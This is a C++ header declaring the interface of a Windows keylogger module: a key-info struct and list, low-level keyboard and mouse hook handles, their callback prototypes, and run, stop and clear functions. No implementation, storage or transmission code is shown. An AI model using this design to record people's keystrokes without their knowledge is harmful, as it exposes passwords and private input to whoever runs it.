#pragma once
#include <Windows.h>
#include <list>

namespace services
{
	namespace keylogger
	{
		typedef struct
		{
			DWORD vkCode;
			WORD lang;
			WORD flags;
		} VirtualKeyInfo;
		typedef std::list<VirtualKeyInfo> VirtualKeyInfoList;

		bool isRunning = false;

		unsigned int vkRepeats;
		int vkListCursor;
		VirtualKeyInfoList vkList;
		VirtualKeyInfo lastKeyPressed;

		HHOOK hhkLowLevelKybd = NULL;
		HHOOK hhkLowLevelMouse = NULL;

		LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
		LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);

		bool run();
		bool stop();
		void processVirtualKey(VirtualKeyInfo vkInfo);
		void onDelete();
		void onBackspace();
		void clear();

		inline bool vkcmp(VirtualKeyInfo vk1, VirtualKeyInfo vk2);
	}
}